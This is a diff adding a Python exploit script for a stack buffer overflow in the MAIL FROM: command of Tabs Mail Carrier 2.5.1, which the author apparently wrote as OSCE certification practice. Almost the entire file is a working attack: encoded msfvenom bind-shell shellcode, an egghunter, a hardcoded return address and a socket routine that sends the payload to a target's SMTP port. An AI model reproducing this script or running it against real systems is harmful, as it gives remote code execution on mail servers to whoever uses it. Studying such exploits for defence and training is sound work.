@@ -1,0 +1,111 @@
+# Exploit Title: Tabs Mail Carrier 2.5.1 MAIL FROM: Buffer Overflow
+# Date: March 14, 2019
+# Exploit Author: Joseph McDonagh
+# Vendor Homepage: N/A
+# Software Link: N/A
+# Version: Mail Carrier 2.5.1
+# Tested on: Windows Vista Home Basic SP2
+# CVE: None
+
+
+#!/usr/bin/python
+#
+# This script started from PWK, Chapter 6
+# I am re-purposing it Tabs Mail Carrier 2.5.1 OSCE practice
+# During testing, I found the MAIL FROM: is also vulnerable to Buffer Overflow
+# Thanks to the original authors of the EHLO parameter, gave me the
+starting point and nudge I needed
+#
+# Usage ./tabs_mail.pwn.py 192.168.1.66
+# Bind shell on TCP port 19397
+# Tested on Windows Vista Home Basic SP 2
+
+import sys
+import socket
+import time
+
+if len(sys.argv) < 2:
+     print "[-]Usage: %s <target addr> " % sys.argv[0]
+
+     sys.exit(0)
+
+ipaddr=sys.argv[1]
+port=25
+
+callebx="\xb1\x32\x9c\x0f"
+sled="\x90" * 8
+egg="T00WT00W"
+
+pay=egg
+
+#msfvenom -p windows/shell_bind_tcp LPORT=19397 -b='\x00' -e
+x86/shikata_ga_nai -f py | sed 's/buf/pay/g'
+#[-] No platform was selected, choosing Msf::Module::Platform::Windows
+from the payload
+#[-] No arch selected, selecting arch: x86 from the payload
+#Found 1 compatible encoders
+#Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+#x86/shikata_ga_nai succeeded with size 355 (iteration=0)
+#x86/shikata_ga_nai chosen with final size 355
+#Payload size: 355 bytes
+#Final size of py file: 1710 bytes
+
+pay += "\xd9\xe9\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1\x53\xbe\x8c"
+pay += "\x69\xbd\xa0\x31\x72\x17\x03\x72\x17\x83\x4e\x6d\x5f"
+pay += "\x55\xb2\x86\x1d\x96\x4a\x57\x42\x1e\xaf\x66\x42\x44"
+pay += "\xa4\xd9\x72\x0e\xe8\xd5\xf9\x42\x18\x6d\x8f\x4a\x2f"
+pay += "\xc6\x3a\xad\x1e\xd7\x17\x8d\x01\x5b\x6a\xc2\xe1\x62"
+pay += "\xa5\x17\xe0\xa3\xd8\xda\xb0\x7c\x96\x49\x24\x08\xe2"
+pay += "\x51\xcf\x42\xe2\xd1\x2c\x12\x05\xf3\xe3\x28\x5c\xd3"
+pay += "\x02\xfc\xd4\x5a\x1c\xe1\xd1\x15\x97\xd1\xae\xa7\x71"
+pay += "\x28\x4e\x0b\xbc\x84\xbd\x55\xf9\x23\x5e\x20\xf3\x57"
+pay += "\xe3\x33\xc0\x2a\x3f\xb1\xd2\x8d\xb4\x61\x3e\x2f\x18"
+pay += "\xf7\xb5\x23\xd5\x73\x91\x27\xe8\x50\xaa\x5c\x61\x57"
+pay += "\x7c\xd5\x31\x7c\x58\xbd\xe2\x1d\xf9\x1b\x44\x21\x19"
+pay += "\xc4\x39\x87\x52\xe9\x2e\xba\x39\x66\x82\xf7\xc1\x76"
+pay += "\x8c\x80\xb2\x44\x13\x3b\x5c\xe5\xdc\xe5\x9b\x0a\xf7"
+pay += "\x52\x33\xf5\xf8\xa2\x1a\x32\xac\xf2\x34\x93\xcd\x98"
+pay += "\xc4\x1c\x18\x34\xcc\xbb\xf3\x2b\x31\x7b\xa4\xeb\x99"
+pay += "\x14\xae\xe3\xc6\x05\xd1\x29\x6f\xad\x2c\xd2\xc4\xeb"
+pay += "\xb8\x34\xb0\xe3\xec\xef\x2c\xc6\xca\x27\xcb\x39\x39"
+pay += "\x10\x7b\x71\x2b\xa7\x84\x82\x79\x8f\x12\x09\x6e\x0b"
+pay += "\x03\x0e\xbb\x3b\x54\x99\x31\xaa\x17\x3b\x45\xe7\xcf"
+pay += "\xd8\xd4\x6c\x0f\x96\xc4\x3a\x58\xff\x3b\x33\x0c\xed"
+pay += "\x62\xed\x32\xec\xf3\xd6\xf6\x2b\xc0\xd9\xf7\xbe\x7c"
+pay += "\xfe\xe7\x06\x7c\xba\x53\xd7\x2b\x14\x0d\x91\x85\xd6"
+pay += "\xe7\x4b\x79\xb1\x6f\x0d\xb1\x02\xe9\x12\x9c\xf4\x15"
+pay += "\xa2\x49\x41\x2a\x0b\x1e\x45\x53\x71\xbe\xaa\x8e\x31"
+pay += "\xce\xe0\x92\x10\x47\xad\x47\x21\x0a\x4e\xb2\x66\x33"
+pay += "\xcd\x36\x17\xc0\xcd\x33\x12\x8c\x49\xa8\x6e\x9d\x3f"
+pay += "\xce\xdd\x9e\x15"
+
+egghunter="\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
+
+# Build the Buffer
+buffer="A" * 700 # 5088 to EIP
+buffer+=pay
+buffer+="B" * (5088 - (700 + len(pay)))
+buffer+=callebx # Overwrite EIP with Call EBX in c:\Windows\System32\expsrv.dll
+buffer+=sled # 5100 bytes mark
+buffer+="C" * 516 # This put us at the EBX register
+buffer+=sled # NOPS
+buffer+=egghunter
+buffer+="D" * (5900 - len(buffer)) # Padding
+
+try:
+	print "[-] Attacking Tab MailC Carrier MAIL FROM: with %s bytes" %len(buffer)
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	connect=s.connect ((ipaddr, port))	# Connect to IP & SMTP port
+	s.recv(1024)				# receive banner
+	s.send('EHLO root@localhost \r\n')	# send EHLO
+	s.recv(1024)				# receive reply
+	s.send('MAIL FROM: ' + buffer + '\r\n') # Send the phony Mail From
+	s.recv(1024)
+	s.send('RCPT TO: evelyn@evelyn \r\n')
+	s.send('QUIT\r\n')
+	s.close()
+	time.sleep(1)
+	print "[-] Done!"
+except:
+	print "[-] Could not connect to target"
+	exit()
